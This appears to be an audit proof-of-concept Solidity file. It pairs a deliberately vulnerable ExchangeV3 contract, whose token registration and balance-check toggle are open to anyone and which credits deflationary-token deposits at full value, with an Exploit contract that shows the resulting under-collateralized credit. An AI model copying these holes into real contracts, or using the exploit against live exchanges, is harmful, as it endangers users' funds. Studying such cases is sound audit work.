// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract ExchangeV3 {
    mapping(address => bool) public checkBalance;
    uint256 public physicalBalance;
    uint256 public creditedBalance;

    function addToken(address token) external {
        // @> VULN: arbitrary users can add a token before its integration check is enabled.
        checkBalance[token] = false;
    }

    function setCheckBalance(address token, bool enabled) external {
        checkBalance[token] = enabled;
    }

    function deposit(address token, uint256 amount) external {
        uint256 beforeBalance = physicalBalance;
        uint256 received = amount * 90 / 100; // deflationary token burns 10%
        physicalBalance += received;
        if (checkBalance[token]) {
            require(physicalBalance - beforeBalance == amount, "balance check");
        }
        creditedBalance += amount;
    }

    function withdraw(uint256 amount) external {
        require(physicalBalance >= amount, "credited balance is unavailable");
        physicalBalance -= amount;
        creditedBalance -= amount;
    }
}

contract Exploit {
    ExchangeV3 public exchange;
    bool public withdrawalBlocked;
    bool public confirmed;

    constructor() {
        exchange = new ExchangeV3();
    }

    function run() external {
        address arbitraryToken = address(0xBEEF);
        exchange.addToken(arbitraryToken);
        exchange.deposit(arbitraryToken, 100);
        require(exchange.creditedBalance() == 100, "deposit was not credited");
        require(exchange.physicalBalance() == 90, "deflationary balance mismatch");
        try this.withdraw() {
            revert("withdraw unexpectedly succeeded");
        } catch {
            withdrawalBlocked = true;
        }
        require(withdrawalBlocked, "under-collateralized credit was not locked");
        confirmed = true;
    }

    function withdraw() external {
        exchange.withdraw(100);
    }
}

